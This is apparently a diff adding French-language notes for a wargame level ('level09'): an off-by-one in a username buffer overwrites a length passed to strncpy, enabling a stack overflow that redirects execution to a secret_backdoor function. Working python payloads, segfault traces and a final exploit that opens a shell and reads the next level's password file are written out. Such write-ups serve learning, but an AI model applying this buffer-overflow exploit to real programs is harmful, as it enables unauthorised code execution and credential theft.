@@ -1,0 +1,35 @@
+idee : overflow sur la len du strncpy. 
+Puis utilisation du strncp pour overfow sur la return addresse
+
+Dans la fonction handle message, les fonctions set_username et set_msg set respectivement des infos dans les buffer username (taille 40) et msg (taille 140). 
+
+Dans la fonction set_username, la boucle while remplit le buffer username de 40 caractères + 1.  
+
+Le + 1 overflow donc dans la variable len qui est utilisé pour faire le strncpy de set_msg. On va donc overflow avec le plus grand nombre que l’on peut ecrire sur un caractere c’est a dire \xff qui vaut 255 pour que le strncpy puisse écrire dans msg + overflow sur l'adresse RSP → on y injectera l'adresse de secret_backdoor
+
+idee : overflow user de 1 pour écrire dans la len envoyé au strncpy. Y mettre une très grande taille. 
+
+U means "undefined" -- the object has a reference to the symbol but no definition
+T means globally defined in the text segment -- the object defines and exports the symbol
+Recherche de l'adresse de secret_backdoor
+0x00.00.55.55.55.55.48.8c  secret_backdoor info functions after run
+
+recherche de l’overflow (entre adresse du buffer msg et l’addresse RSP)
+Faire segfault le programme a la bonne adresse (verification avec a commande dmesg)
+
+(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*196 + '\n'") | ./level09
+[ 3066.466893] level09[2195]: segfault at 0
+
+(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\n'") | ./level09
+[ 2955.434072] level09[2107]: segfault at a ip 000000000000000a
+
+(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*204 + '\n'") | ./level09
+dmesg 
+[ 2080.946513] level09[1951]: segfault at a41414141 --> les 4 premier bit sont nos 4 premier A
+
+--> Overflow a 200
+
+
+(python -c "print 'A'*40 + '\xff' + '\n' + 'A'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh' + '\n'"; cat) | ./level09
+
+cat /home/users/end/.pass
